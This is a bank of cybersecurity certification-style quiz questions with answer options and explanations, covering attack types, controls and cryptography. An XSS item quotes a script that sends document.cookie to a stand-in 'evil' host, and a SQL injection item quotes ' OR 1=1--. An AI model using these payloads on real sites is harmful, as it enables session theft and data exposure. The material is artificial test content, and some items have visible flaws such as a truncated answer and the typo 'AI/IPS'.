questions.question: A user receives an email appearing to be from their bank, urging them to click a link and verify their account details. The link leads to a convincing replica of the bank's website hosted on an unfamiliar domain. What type of attack is this?
options: Vishing — a voice-based attack in which a caller impersonates a trusted institution to extract sensitive information
Pretexting — fabricating a detailed backstory to build trust and manipulate a target into revealing confidential data
Smishing — a text-message lure that directs the recipient to a malicious link or prompts a call-back, unlike email phishing which spoofs a sender address to harvest credentials
Phishing — an email-based attack using a spoofed sender and a counterfeit site to harvest user credentials
questions.explanation: Phishing uses deceptive emails with spoofed senders and lookalike websites to trick users into entering credentials on attacker-controlled pages. Vishing and smishing are closely related social-engineering variants but use voice calls and SMS as the delivery channel, not email.

questions.question: A forensic team investigates a financial database and finds that a privileged account was used to manipulate stored interest-rate calculations over a 6-week period. All authorized users retained read access throughout, and no data was exfiltrated. Which element of the CIA triad was MOST directly violated?
options: Availability — authorized personnel were periodically denied access to the affected records during each manipulation event
Confidentiality — the privileged account accessed data beyond its authorized classification boundary
Non-repudiation — the audit log did not record the account name associated with each transaction
Integrity — stored values were altered without authorization, compromising data accuracy
questions.explanation: Integrity ensures data remains accurate and unmodified; unauthorized alteration of stored financial calculations is a direct integrity violation regardless of whether data was disclosed. Availability was unaffected because users retained read access throughout, and confidentiality was unaffected because no data left the system.

questions.question: A company's remote-access policy requires employees to enter their password and then approve a push notification on their registered smartphone before VPN access is granted. The smartphone must be physically present for the login to succeed. Which authentication concept does this implement?
options: Multi-factor authentication, combining a knowledge factor and a possession factor from distinct categories
Single sign-on (SSO), allowing a single credential set to authenticate the user across multiple systems
Step-up authentication, which re-prompts the same credential type when a session attempts privileged actions
Federated identity, which delegates authentication to a trusted third-party identity provider across boundaries
questions.explanation: Multi-factor authentication requires factors from at least two different categories — here, 'something you know' (password) and 'something you have' (smartphone). SSO simplifies access by using one set of credentials for multiple systems, which is the opposite of adding a second distinct factor.

questions.question: A penetration tester on the same open Wi-Fi network as a target uses ARP spoofing to redirect the target's traffic through the tester's laptop before forwarding it to the hotel gateway, capturing session cookies in transit. Which class of attack does this scenario describe?
options: Replay attack — re-submitting captured authentication tokens to impersonate the original user after the session ends
Man-in-the-middle attack — covertly inserting between two parties to observe or alter their communications undetected
Denial-of-service attack — flooding gateway resources with spoofed packets to prevent other guests from connecting
Credential stuffing — cycling through a leaked username-password list against the hotel portal's authentication endpoint
questions.explanation: ARP spoofing lets the attacker silently relay traffic between the victim and the gateway while reading or modifying it — the defining characteristic of a man-in-the-middle attack. A replay attack reuses previously captured tokens after a session ends; it does not involve real-time interception and relay of live traffic.

questions.question: A network architect must enforce traffic policy between the corporate LAN and the internet, blocking connections to disallowed ports and permitting only approved protocols. The solution should track TCP session state and apply rules based on packet headers at the network perimeter. Which technology best satisfies this requirement?
options: A stateful inspection firewall — tracks connection context to enforce traffic policy beyond static port/address matching
Network IDS, which passively mirrors traffic and generates alerts without intercepting or blocking any packets

Web application firewall (WAF), which inspects HTTP/HTTPS payloads at Layer 7 to block malicious requests — WAF does not track connection state to enforce stateful traffic policy between arbitrary endpoints
Reverse proxy, which relays client requests through an intermediary and can cache responses from origin servers
questions.explanation: A stateful firewall maintains a connection-state table for TCP sessions and enforces allow/deny rules based on IP address, port, and protocol — exactly what is needed for perimeter enforcement between LAN and internet. A WAF operates only on HTTP/HTTPS at Layer 7 and is designed to block web application exploits, not general port-and-protocol filtering.

questions.question: A hospital's file servers become inaccessible over a holiday weekend. Administrators discover every patient-record folder has been encrypted, and a ransom note demands 10 Bitcoin in exchange for the decryption key. Security logs show the encryption was performed by a remote process that spread through a compromised service account. What category of malware caused this incident?
options: Worm, which self-replicates across network shares by exploiting service vulnerabilities — a worm propagates autonomously but does not encrypt files or demand a ransom payment in exchange for a decryption key
Spyware, which covertly captures user activity and transmits harvested credentials to a remote collection server
Ransomware, which encrypts victim files and withholds the decryption key pending payment of a demanded ransom
Rootkit, which embeds itself in the OS kernel to maintain persistent privileged access while hiding its presence
questions.explanation: Ransomware encrypts data and withholds the key until a ransom is paid — the Bitcoin demand and encrypted patient records are defining indicators. A worm also propagates through a network autonomously, but its goal is self-replication and spread, not file encryption for extortion.

questions.question: A cloud security architect is designing a system where remote contractors must authenticate to internal APIs. The solution must issue short-lived credentials signed by an internal trust anchor, support immediate revocation when a contractor is terminated, and let relying parties verify credential authenticity offline without querying the issuer on each request. Which framework encompasses the trust anchor, registration process, and revocation mechanisms in this design?
options: LDAP — a directory service protocol that stores and retrieves identity attributes but provides no certificate-issuance framework and has no built-in certificate revocation mechanism
Kerberos — a ticket-based authentication system in which a Key Distribution Center grants short-lived service tickets on a per-session basis
PKI — a framework of certificate authorities and revocation infrastructure governing the full digital-certificate lifecycle
RADIUS — a centralized AAA protocol that authenticates users and authorizes network access against credentials held in a shared back-end store
questions.explanation: PKI provides the complete infrastructure — including certificate authority (CA) hierarchy, registration authority (RA), certificate revocation lists (CRL), and OCSP — for issuing, distributing, and revoking X.509 digital certificates. Kerberos provides mutual authentication using tickets rather than certificates and does not provide a certificate revocation mechanism, making it unsuitable when credentials must be verifiably invalidated before expiry.

questions.question: A financial application encrypts gigabytes of transaction logs at rest and uses TLS to protect connections between its app server and clients over the public internet. During a code review a developer asks why two different encryption methods are required. Which statement correctly explains the design choice?
options: Symmetric algorithms (e.g., AES) encrypt bulk data efficiently with a shared key; asymmetric algorithms (e.g., RSA/ECDH) negotiate that shared key across the untrusted channel
Asymmetric algorithms handle bulk data with lower CPU overhead than symmetric; symmetric encryption is reserved for verifying digital signatures during the TLS handshake only
Both algorithm types require a pre-shared key established out-of-band; the distinction is driven entirely by key length, not by performance or operational use-case differences
Symmetric encryption cannot protect data at rest and is limited to in-transit traffic, so asymmetric algorithms handle storage while symmetric is used solely for the TLS handshake
questions.explanation: Symmetric encryption (e.g., AES) uses the same key for both encryption and decryption, making it highly efficient for large data volumes such as transaction logs stored at rest. Asymmetric encryption (e.g., RSA, ECDH) uses a key pair so that two parties can securely agree on a shared session key without ever transmitting it — this is why TLS uses asymmetric for the handshake and symmetric for bulk data transfer. Option B is incorrect because asymmetric algorithms are orders of magnitude slower than symmetric and are never used for bulk data encryption.

questions.question: Threat intelligence analysts discover that attackers are actively exploiting a remote-code-execution flaw in a widely deployed enterprise VPN appliance. The vendor has not yet acknowledged the vulnerability, no CVE identifier has been assigned, and no mitigation guidance is available. How should this vulnerability be classified?
options: Critical CVE — a flaw formally registered in the NVD with a CVSS score calculated and published by NIST
End-of-life vulnerability — a flaw that persists because the affected version no longer receives vendor patches
Zero-day vulnerability — under active exploitation before the vendor has issued any patch or public acknowledgement
N-day vulnerability — a disclosed flaw for which a vendor patch exists but has not been widely deployed
questions.explanation: A zero-day vulnerability is exploited in the wild before the vendor knows about it and before any patch or official mitigation is available — the absence of a CVE, no vendor acknowledgment, and active exploitation are the key indicators. An n-day differs because the vendor has already disclosed the vulnerability and a patch exists, even if many deployments remain unpatched.

questions.question: A network engineer deploys a security appliance in span/mirror-port mode off a core switch so it receives a copy of all traffic passing through. The appliance evaluates packets against known attack signatures and sends real-time alerts to the SOC dashboard. When the SOC reviews a flagged brute-force login attempt, they discover the attack traffic reached the authentication server unimpeded. Why did the appliance not stop the attack?
options: The appliance is a next-generation firewall (NGFW) that requires updated threat-intelligence feeds — an NGFW inspects and blocks packets inline; it does not operate out-of-band and generates policy-enforcement actions rather than passive alerts on suspicious packets
The appliance is an IDS, which operates out-of-band on mirrored traffic and generates alerts but cannot intercept or drop live packets
The appliance is a web application firewall (WAF), which only inspects HTTP/HTTPS application-layer payloads and ignores non-web authentication traffic
The appliance is a security information and event management (SIEM) system, which aggregates and correlates log data but does not sit in the traffic path
questions.explanation: An IDS operates in passive/out-of-band mode: it receives a copy of traffic via a span or tap, analyzes it, and raises alerts, but it has no ability to drop or modify packets flowing on the live network. An IPS, by contrast, is placed inline in the traffic path so it can intercept and block malicious packets in real time — the key functional difference the scenario is testing.

questions.question: A PKI engineer is tasked with updating the organization's internal certificate authority to align with current NIST cryptographic transition requirements. The existing CA signs certificate requests using SHA-1. Which algorithm should replace SHA-1 for all new signing operations?
options: MD5 — 128-bit output, widely supported and computationally efficient for bulk certificate issuance

SHA-1 — 160-bit output, still accepted by some legacy CAs for internal non-public certificates, but deprecated for new digital signing operations and no longer considered a current NIST-approved algorithm for PKI signing
SHA-256 — current NIST standard for new digital signatures; approved for all PKI signing operations
BLAKE2b — faster than SHA-256 with equivalent output size, but absent from the NIST approved list for PKI use
questions.explanation: NIST deprecated SHA-1 for digital signature generation and mandates SHA-256 or stronger (SHA-2/SHA-3 family) for new certificate signing operations. MD5 was deprecated even earlier due to demonstrated collision vulnerabilities. BLAKE2b is cryptographically strong but is not included in NIST SP 800-131A's approved algorithm list for PKI signing, making it unsuitable for a compliance-aligned CA.

questions.question: A threat actor calls an organization's IT help desk, claims to be the newly hired CFO, and says they forgot their VPN credentials while traveling. The help desk agent resets the account without verifying identity. Which attack category BEST describes the technique the threat actor used?
options: Social engineering — manipulating people through deception rather than technical exploits
Replay attack — reusing previously captured authentication tokens to authenticate as a known user
Credential stuffing — systematically submitting leaked username-password pairs against the portal
Pass-the-hash — authenticating with a stolen NTLM credential hash to bypass password requirements
questions.explanation: Social engineering exploits human trust and authority rather than software vulnerabilities — the attacker achieved their goal through impersonation alone, never touching a technical control. Replay attacks, credential stuffing, and pass-the-hash are all technical exploitation methods that require captured tokens or credential data; none involves the psychological manipulation used here.

questions.question: A financial institution runs firewalls, IDS sensors, endpoint agents, and authentication servers that each produce independent logs. Analysts frequently miss multi-step attacks because relevant data is scattered across disconnected systems. Management wants a single platform to centralize security telemetry, identify threats that span multiple sources, and generate prioritized alerts. Which technology category addresses this requirement?
options: SOAR — executes automated playbooks to handle enrichment, cross-tool security response actions, and ticket creation, but does not ingest and correlate logs to detect multi-stage or multi-vector attacks across your security controls
CASB — intercepts user traffic to cloud services to enforce data governance, detect anomalous uploads, and discover unsanctioned shadow-IT applications
SIEM — centralises log collection from disparate security controls, applies correlation rules to surface multi-stage attacks, and delivers prioritised findings in a unified console
NDR — passively analyzes network flow metadata and packet contents to detect lateral movement and encrypted C2 channels that host-based sensors may independently miss
questions.explanation: A SIEM centralizes log collection from every security data source, normalizes the data into a common format, and applies correlation rules to surface attack sequences that no single system would reveal alone. A SOAR platform automates responses to existing alerts but does not aggregate logs or perform cross-source detection — it consumes SIEM output rather than replacing it.

questions.question: An e-commerce platform processing holiday orders observes a sudden flood of HTTP requests originating from thousands of geographically diverse IP addresses. Within minutes, web servers reach 100% CPU utilization, checkout transactions time out, and the load balancer begins dropping connections. The operations team confirms the traffic is composed of synchronized request bursts from ranges associated with known compromised consumer IoT devices. Which attack type best describes this event?
options: SQL injection — an attacker crafting malicious database queries through unsanitized input fields — this targets database processing but does not involve a traffic flood from compromised external hosts overwhelming the victim's network capacity
Distributed denial-of-service (DDoS) — a coordinated traffic flood from many compromised hosts designed to exhaust a target’s processing resources
Credential stuffing — automated submission of breached username-password pairs against authentication endpoints to compromise individual accounts
Cross-site request forgery (CSRF) — tricking authenticated users into unknowingly submitting unauthorized requests through their active browser sessions
questions.explanation: A DDoS attack uses a large number of geographically distributed hosts (often a botnet of compromised devices) to flood a target with traffic or requests, overwhelming its resources and denying service to legitimate users — exactly what the synchronized IoT botnet traffic describes. Credential stuffing also leverages distributed sources, but its goal is account takeover through login attempts, not resource exhaustion.

questions.question: After a breach, forensics reveals that attackers moved from the DMZ to the internal finance subnet in under 10 minutes. A single perimeter firewall with a misconfigured allow-all rule for east-west traffic was the only control between segments — no IDS, no endpoint detection, no logging. The CISO demands a full architecture redesign. Which security principle should govern the new design?
options: Least privilege — restrict every service account and process to the minimum permissions required for its function
Defense in depth — layer independent controls so a bypass or misconfiguration of any single mechanism does not expose the entire environment
Security by obscurity — remove internal subnet details from documentation and contractor diagrams to reduce attacker reconnaissance value
Zero trust — mandate continuous cryptographic verification of every east-west connection, eliminating implicit trust within the data center perimeter boundary
questions.explanation: Defense in depth directly addresses the root cause: the architecture relied on a single control that failed. Layering segmentation, IDS/IPS, endpoint detection, and logging means no single misconfiguration gives unrestricted lateral access. Zero trust (option D) is a related but distinct strategy focused on per-session authentication and access control; it does not by itself add the detection and containment layers that would have slowed the attacker in this scenario.

questions.question: A penetration tester auditing a retail application's order search feature submits the value ‘ OR 1=1-- into the Order ID field. Instead of an error, the application returns every order in the database, exposing other customers’ personal information. The development team traces the root cause to the query builder concatenating user-supplied input directly into the database query without sanitization. Which OWASP Top 10 vulnerability category best describes this flaw?
options: Broken access control — the application fails to enforce per-user data visibility boundaries, regardless of what the user input contains — it is an authorization flaw, not an input interpretation vulnerability
Security misconfiguration — a missing transport-security policy exposes the query string to interception and replay by an on-path attacker
Injection — unsanitized user input is interpreted as executable commands by the back-end interpreter, altering the intended query logic
Cryptographic failures — order data is stored without encryption, exposing sensitive records when the database file is accessed directly
questions.explanation: OWASP A03:2021 Injection covers flaws where untrusted data is sent to an interpreter as part of a command or query, causing the interpreter to execute unintended commands — exactly what happens when user input is concatenated unsanitized into a SQL query. Broken access control (A01) is a plausible distractor because the result is unauthorized data disclosure, but the root cause is improper input handling, not a missing authorization check.

questions.question: A financial services company has deployed email filtering, MFA, EDR, and network-layer controls across the organization. After a quarterly phishing simulation, the security team finds that 38% of employees clicked a simulated malicious link — unchanged from the previous quarter despite tightening technical controls. The CISO concludes the gap is behavioral: employees are not recognizing social-engineering indicators before clicking. Which control type most directly addresses this root cause?
options: Privileged access management (PAM) — vaults administrative credentials and enforces just-in-time access as a technical security control — PAM limits blast radius but does not change employee behaviour so that staff recognise manipulation without technical controls
Endpoint detection and response (EDR) — monitors endpoint processes in real time and isolates hosts exhibiting malicious post-execution behavior
Intrusion prevention system (IPS) — inspects traffic inline and blocks connections matching known malicious signatures before they reach endpoints
Security awareness training — changes employee behaviour so staff recognise manipulation attempts that bypass technical controls
questions.explanation: Security awareness training directly addresses the human element by building employees’ ability to recognize and resist social-engineering tactics — the root cause the CISO identified. EDR and IPS are reactive or signature-based technical controls; they can limit damage after a click but do not change the behavior that causes employees to click in the first place.

questions.question: A security director scopes two engagements. Engagement A runs Nessus and Qualys against production hosts and delivers a CSV of findings with CVSS scores. Engagement B starts from a similar finding list, but a small red team then chains the findings to compromise a domain admin, exfiltrate test data, and document the impact. Which engagement is which?
options: Both engagements deliver the same artefact; the labels are interchangeable
A is a vulnerability assessment; B is a penetration test
A is a penetration test; B is a vulnerability assessment
Both engagements are penetration tests; only the toolset differs
questions.explanation: A vulnerability assessment identifies and reports weaknesses — typically by running scanners like Nessus or Qualys and ranking findings by CVSS. A penetration test goes further: the testers actively exploit the weaknesses to demonstrate real-world impact (privilege escalation, data exfiltration). The two are distinct deliverables; calling them interchangeable is a procurement red flag.

questions.question: An IAM design review covers three responsibilities for the new VPN concentrator: (1) verifying who the user is when they connect, (2) deciding what resources that user is allowed to reach, and (3) recording the timestamps and bytes-per-session for compliance audits. The vendor brochure refers to all three as 'AAA'. Which expansion of AAA matches these three responsibilities in order?
options: Antivirus, Authentication, Authorization — three security A-words but not the AAA spec
Access, Audit, Administration — three IAM-related A-words, also not the AAA spec
Authentication, Authorization, Accounting — the AAA acronym used by RADIUS / TACACS+
Application, API, Authentication — three protocol-layer A-words, not the AAA spec
questions.explanation: AAA: Authentication (verify identity), Authorization (determine what access is permitted), Accounting (log what the user did). RADIUS and TACACS+ are common AAA protocols.

questions.question: A pharma company's CISO needs to stop a recurring leak: employees emailing patient PHI as unencrypted attachments to personal Gmail accounts before resigning. The chosen control must (1) inspect outbound email + USB writes + cloud-upload traffic, (2) classify PHI by content fingerprint, and (3) block (not just log) the transfer when policy fires. Which control category fits these three requirements?
options: Full-disk encryption — protects data at rest if a laptop is stolen; does nothing for outbound transfers
SIEM correlation — generates alerts after the fact, doesn't inspect or block the transfer in line
Data Loss Prevention (DLP) — content-aware inspection of outbound channels that can block sensitive transfers
Endpoint antivirus — scans files for known malware signatures, not for sensitive content patterns
questions.explanation: DLP solutions monitor and control data movement (email, USB, cloud uploads) to prevent sensitive information (PII, financial data, IP) from leaving the organization without authorization.

questions.question: A security researcher analyzes a crash dump from a legacy C-based file parsing library. The debugger shows the instruction pointer holds a value sourced directly from the user-supplied test file, and adjacent fields on the stack frame contain bytes from the parsed input. ASLR and stack canaries were both disabled. Which vulnerability class BEST describes the root cause?
options: Integer overflow — arithmetic wraps past the integer type's maximum value, silently corrupting a calculation and potentially overwriting adjacent values in memory — this is an arithmetic flaw, not a case where input data exceeds a buffer's allocated bounds
Buffer overflow — input data exceeds the allocated buffer's bounds, overwriting adjacent memory and altering control flow
Format string vulnerability — attacker-controlled printf specifiers expose or overwrite adjacent memory locations directly through the format string, not by exceeding an allocated buffer's bounds
Use-after-free — freed heap memory is accessed via a dangling pointer after reallocation, letting attackers influence object contents
questions.explanation: A buffer overflow occurs when a write operation exceeds the bounds of its allocated buffer, overwriting adjacent memory — in this scenario, bytes from the input file overwrote the stack frame and redirected the instruction pointer. Integer overflows are a distinct arithmetic class that can sometimes precede buffer overflows but are a different root cause. Format string vulnerabilities exploit printf-family format specifiers, not buffer bounds. Use-after-free involves accessing freed heap memory, a separate memory-safety class from stack-based buffer overflows.

questions.question: A development team's penetration test report flagged two critical findings: a query parameter that passes unsanitized input directly to a SQL statement, and an admin login page with no brute-force rate limiting. The team wants a single authoritative reference to categorize both findings and guide prioritization of remediation across their web application. Which resource should they consult?
options: NIST SP 800-53 — a comprehensive catalog of security and privacy controls mapped to federal compliance frameworks — it covers broad control families but is not a web-application-specific remediation guide organised by vulnerability category
CIS Critical Security Controls — 18 prioritized safeguards targeting enterprise-wide defensive posture against common attack techniques
OWASP Top 10 — ranks the ten most critical web application risk categories and provides developer-focused remediation guidance
OWASP ASVS — a tiered requirements checklist for designing and verifying security across the web application development lifecycle
questions.explanation: The OWASP Top 10 is the standard reference for categorizing web application risks — SQL injection and broken authentication (lack of brute-force protection) are both named risk categories in the list. NIST SP 800-53 provides broad enterprise security controls, not web-app risk rankings. CIS Controls target enterprise-wide defensive posture rather than per-vulnerability web risk prioritization. OWASP ASVS is a verification standard for application design and testing, not a risk-ranking reference for triaging discovered findings.

questions.question: A new auth/authz design splits responsibilities between two services. Service A receives the user's credentials, validates the username/password against the IdP, and issues a signed token containing the user's identity claims. Service B reads that token, looks up the user's role + tenant, and decides whether THIS specific request to /api/payouts is allowed. Which split is being described?
options: Both services do the same job, only the deployment topology differs
Service A authorises before Service B authenticates (zero-trust ordering)
Service A authenticates (confirms the caller's identity)
Both services jointly issue a token that proves identity + grants permissions atomically
questions.explanation: AuthN (authentication) = proving identity (password, fingerprint, certificate). AuthZ (authorization) = what actions/resources are permitted after authentication. Both are required for access control.

questions.question: A SOC engineer deploys an internet-facing Linux VM that looks like a misconfigured database server with obvious default credentials. The VM logs every connection, captures full command history, and dumps any malware uploaded to it for analyst review. It hosts no real data and is isolated from production. Which security construct is this?
options: Privileged password vault — stores and rotates real credentials, not a decoy
Quarantine VLAN — a destination for suspicious live traffic, not a fake server
Remote-access VPN endpoint — legitimate user access, not adversary lure
Honeypot — a deliberately decoy system designed to attract and study attackers
questions.explanation: Honeypots are deliberately vulnerable fake systems that detect and analyze attacks. When an attacker interacts with a honeypot, it triggers alerts and captures attack techniques.

questions.question: A security team discovers a missing authentication check on an internal admin portal. A nation-state group known to target the industry is actively scanning for such portals. The CISO asks for a risk statement using standard risk-model vocabulary. Which mapping is correct?
options: Missing auth check = vulnerability; nation-state group = threat; their combined exposure = risk
Missing auth check = threat; nation-state group = vulnerability; admin portal = risk
Nation-state group = risk; missing auth check = threat; the admin portal = vulnerability
Risk is measured by patch age only; threats and vulnerabilities are qualitative assessments only
questions.explanation: In the standard risk model, a vulnerability is a system weakness (the missing auth check), a threat is an actor or event capable of exploiting it (the nation-state group), and risk is the resulting exposure — typically quantified as likelihood × impact. Options B and C swap the definitions of threat and vulnerability, which would invert risk prioritization and lead to hardening the threat actor rather than patching the exploitable weakness.

questions.question: A web browser is presented with a TLS server certificate that is well within its validity window and is signed by a trusted CA. Before trusting it, the browser must verify the CA hasn't revoked the certificate early (e.g., because the server's private key was compromised). Which of the following data sources is the AUTHORITATIVE list of certificates that have been revoked by a CA?
options: DNS CAA record — declares which CAs may issue certificates for a domain, but is not a CA-signed list of certs that have been revoked before their expiry
Certificate Transparency log — public list of issued certs, not a list of certs revoked before expiry
Certificate Revocation List (CRL) — a CA-signed list of certs revoked before their expiration
TLS session-ticket cache — speeds up resumption, has no view of certs revoked before expiry
questions.explanation: A CRL is a CA-signed, periodically published list of certificate serial numbers revoked before their natural expiration (e.g., due to private-key compromise, CA mistake, or subject change). OCSP is the same data on a per-cert query basis. CAA, CT logs, and session tickets are unrelated to revocation. NOTE: prior version of this question mismarked the correct option (claimed CRLs listed naturally-expired certificates) — fixed during 2026-05-13 audit pass.

questions.question: A forensics team obtains a multi-year archive of a company's TLS-encrypted traffic and legally acquires the web server's long-term private key. They discover the archived sessions still cannot be decrypted. Which TLS feature explains this outcome?
options: Certificate pinning — the client hardcodes the expected server certificate fingerprint to prevent MITM substitution — pinning validates the certificate identity but does not prevent past session records from being decrypted if the long-term private key is later compromised
Perfect forward secrecy — ephemeral session keys are discarded after use; past recordings cannot be decrypted
HSTS preloading — the browser enforced HTTPS connections but this policy does not protect past recorded sessions
OCSP stapling — the CA validates certificate revocation status in real time but does not affect session key recoverability
questions.explanation: Perfect forward secrecy (PFS) uses ephemeral Diffie-Hellman key exchange (ECDHE) to derive a unique session key that is discarded immediately after the session ends — even possessing the server's long-term private key cannot reconstruct it, so archived ciphertext is permanently unreadable. Certificate pinning, HSTS, and OCSP stapling are valuable TLS controls but none of them affect whether historical session keys can be recovered after the fact.

questions.question: An IAM team manages access for 2,000 employees by defining named job-function profiles — Analyst, Developer, Manager — and attaching permissions to those profiles. A new hire receives access automatically by being added to the appropriate profile. Which access control model does this describe?
options: RBAC — access granted by job-function category membership, inheriting that category's full permission set
MAC — the OS enforces classification labels and clearance levels regardless of job function or resource ownership — permissions follow label rules, not role membership based on job function
DAC — individual resource owners decide who can access their own files, shares, or database records
ABAC — access decisions evaluate multiple attributes including user department, device posture, and time of day
questions.explanation: RBAC centralizes permissions in job-function roles rather than individuals — a new Analyst inherits exactly the Analyst role's permissions with no per-user grants needed. MAC relies on OS-enforced security labels; DAC lets owners control their own resource permissions directly; ABAC evaluates dynamic attribute combinations per request — all three differ fundamentally from the role-inheritance model described in the scenario.

questions.question: A bug-bounty report shows that a comment field on a forum reflects user input back into the page without escaping. A malicious user posted `<script>fetch('//evil/?c='+document.cookie)</script>`. Every subsequent visitor's browser executes the script under the forum's origin and leaks their session cookie. Which web vulnerability is this?
options: Cross-Site Scripting — attacker script runs in another user's browser under the site's trusted origin
Cross-Site Request Forgery — the user's browser is forced to send a script-free authenticated request under the user's own session, not a script running under the attacked site's origin
Server-Side Request Forgery — server fetches an attacker-chosen URL from inside the network, no client-side script or origin
SQL Injection — crafted input changes the database query, no client-side script, no origin issue
questions.explanation: XSS injects malicious JavaScript into web pages. Stored XSS: saved in database, runs for all users. Reflected XSS: in URL parameters. DOM XSS: manipulates client-side DOM. Prevention: output encoding, CSP.

questions.question: Remote engineers connect to corporate resources over public Wi-Fi. The security team needs every byte between laptop and HQ encrypted, with mutual peer authentication and a routed path into internal subnets. Which technology meets this need?
options: A TLS-only forward web proxy serving HTTPS browsing traffic
A stateful perimeter firewall enforcing inbound access-control rules
An IPSec or SSL-based VPN client with certificate-based endpoint auth
An SD-WAN appliance applying QoS marking across inter-branch traffic
questions.explanation: A VPN client establishes an authenticated, encrypted tunnel between the remote laptop and HQ and routes traffic into internal subnets — exactly the three requirements. IPSec (IKEv2) and SSL/TLS (OpenVPN, WireGuard) are the standard protocols. A web proxy only relays HTTP/S and does not route arbitrary subnets. A firewall enforces policy but is not itself the encrypted tunnel. SD-WAN solves site-to-site bandwidth and QoS — not remote-user encryption.

questions.question: A security firm is hired to evaluate a regional bank's external attack surface under a signed statement of work. The team begins by collecting publicly available information about the bank's infrastructure and personnel from open sources. They then actively probe discovered hosts, gain access through an identified service vulnerability, pivot to an internal server, and deliver a written report with prioritized remediation recommendations. Which engagement model does this describe?
options: Vulnerability assessment — automated scanning that identifies and ranks weaknesses without a structured exploitation engagement and without producing a remediation report from a human tester
Penetration test — a structured authorized engagement covering reconnaissance, exploitation, post-exploitation, and remediation reporting
Red team exercise — covert, objective-based adversary simulation targeting people, processes, and technology over an extended multi-week period
Bug bounty program — crowd-sourced researcher submissions rewarded by the target organization based on severity and proof-of-concept quality
questions.explanation: The scenario describes a standard penetration test: scoped, authorized reconnaissance; active exploitation of a discovered vulnerability; post-exploitation lateral movement; and a remediation report — the defining phases of a penetration testing engagement. A vulnerability assessment stops before active exploitation. A red team exercise is typically covert and objective-based rather than constrained to a specific service scope. A bug bounty is an ongoing crowd-sourced program, not a structured firm engagement with a defined statement of work.

questions.question: A SOC manager wants weekly briefings combining (a) tactics, techniques, and procedures attributed to active threat actors, (b) recent IOCs (IP, domain, hash) seen targeting the industry, and (c) emerging malware trends. The output drives detection-engineering priorities, not endpoint hardening directly. Which capability is being described?
options: Antivirus signature feed — endpoint-specific malware sigs, not TTP-level briefings
Network performance telemetry — saturation/utilisation data, no threat actor context
UEBA behavioural analytics — user/device anomaly detection, not external threat context
Threat intelligence
questions.explanation: Threat intelligence (TI) provides context about threats: who attacks, how they attack, what they target. Sources: OSINT, dark web, ISACs, commercial feeds. Feeds into SIEM, firewalls, and incident response.

questions.question: A retail company's POS terminals, corporate workstations, and internal file servers all share a flat Layer 2 network with no VLAN separation. After a POS malware incident, forensics shows the attacker pivoted directly from the infected terminal to the HR file server. Which architectural change would have MOST limited the attacker's ability to move laterally after the initial POS compromise?
options: Deploy a next-generation firewall at the internet edge to inspect and block inbound threats — a perimeter firewall does not segment internal VLAN boundaries or isolate POS terminals from HR workstations sharing the same corporate flat network
Implement VLAN segmentation with inter-zone ACLs to isolate POS terminals from HR servers and corporate workstations on separate broadcast domains
Enable endpoint detection and response on all POS terminals to detect malware and automatically isolate infected hosts before lateral movement to adjacent systems can occur

Require 802.1X certificate-based port authentication on all switch ports in every VLAN — 802.1X validates network identity at the port level but does not create VLAN segmentation boundaries or apply inter-zone ACLs on the corporate network to isolate POS traffic
questions.explanation: Network segmentation with VLANs and inter-zone firewall rules contains lateral movement — a POS terminal in its own isolated zone cannot reach HR servers unless a rule explicitly permits that path. A perimeter firewall (option A) would not have helped here because both the initial compromise and the subsequent pivot occurred entirely on the internal network, after the attacker was already inside the perimeter.

questions.question: A hospital's security team is paged at 2 AM when clinical systems go offline due to ransomware. With patient data encrypted and operations impaired, team members are uncertain who leads containment, who notifies regulators, and what technical steps should follow. Which organizational document, prepared in advance, defines these roles and procedures and guides the team through the response?
options: Business Continuity Plan — a document describing how essential operations continue during any major security disruption — it covers operational recovery but does not define the containment steps or forensic procedures in an incident response plan

Disaster Recovery Plan — documents the RTO and RPO targets and the technical steps for restoring IT systems after a security incident — DRP covers recovery of operations after disruption but does not define the escalation, containment steps, and eradication procedures in an incident response plan
Incident Response Plan — a pre-approved document defining escalation paths, containment procedures, and eradication steps for declared security incidents
Risk Register — catalogs identified risks with likelihood and impact ratings and the treatment controls approved by governance leadership for each risk category
questions.explanation: An incident response plan provides the pre-practiced playbook for security events — who leads, who communicates with legal and regulators, and what technical steps occur in sequence, so no time is lost making decisions under pressure. A disaster recovery plan overlaps in the recovery phase but focuses on restoring IT infrastructure from backups rather than on the containment, eradication, and forensic procedures that define security incident response.

questions.question: A NOC is buying a new perimeter security appliance. Vendor A's device sits inline and DROPS packets that match malicious signatures. Vendor B's device sits on a SPAN port, ALERTS on the same signatures but cannot stop the traffic. Which AI/IPS distinction does this describe and which vendor is which?
options: Both vendors offer IPS — both inspect inline; difference is throughput class only
Both vendors offer IDS — both passive; difference is signature update cadence
Vendor A = IPS (inline, blocks); Vendor B = IDS (passive, alerts only)
Vendor A = IDS (alerts on the SPAN port); Vendor B = IPS (drops inline)
questions.explanation: IDS (Intrusion Detection System) monitors and alerts — doesn't block. IPS (Intrusion Prevention System) sits inline and blocks malicious traffic in real time. Both use signatures and anomaly detection.

questions.question: A SOC analyst examining exfiltrated data finds a JPEG of an office party uploaded to a public-facing photo-sharing site. A forensic extraction shows the file contains an embedded ZIP archive of customer records hidden in the image's least-significant bits, undetectable to the human eye. The file passes content-inspection filters because its visible payload is a normal photo. Which exfiltration technique is in use?
options: DNS tunneling — encoding the image's data into DNS queries to a controlled name server to evade content inspection — DNS tunneling encodes arbitrary data in DNS but does not embed the data inside a carrier image file
Asymmetric encryption with a public key — the file is encrypted but its presence is not hidden, image content visible
ICMP covert channel — embedding the file's bytes in ping payloads, no image carrier needed
Steganography — hiding the data inside an innocuous image carrier file to defeat content inspection
questions.explanation: Steganography hides messages within cover files. Example: embedding secret text in the least significant bits of image pixels. Different from encryption — encryption hides the content; steganography hides the existence.

questions.question: An incident response team traces a breach to a code-signed update for a widely used network-monitoring product pushed through the vendor's normal release channel. Forensics show the malicious build was assembled inside the vendor's CI/CD pipeline weeks earlier, then signed with the vendor's legitimate publisher certificate before being pushed to customers. Which attack class BEST describes this scenario?
options: Supply chain attack — adversary compromises a trusted supplier and weaponises a normal signed release
Watering-hole attack — adversary poisons a site the victims frequent so a normal release-day visit triggers exploit
Drive-by download — exploit served to any visitor of a poisoned page, unrelated to a vendor's release pipeline
Insider threat — a privileged employee deliberately corrupts the normal release before the build is signed
questions.explanation: Supply chain attacks target trusted software vendors. Attackers compromise a legitimate software update or hardware component, affecting all downstream customers who trust and install it. Very difficult to detect.

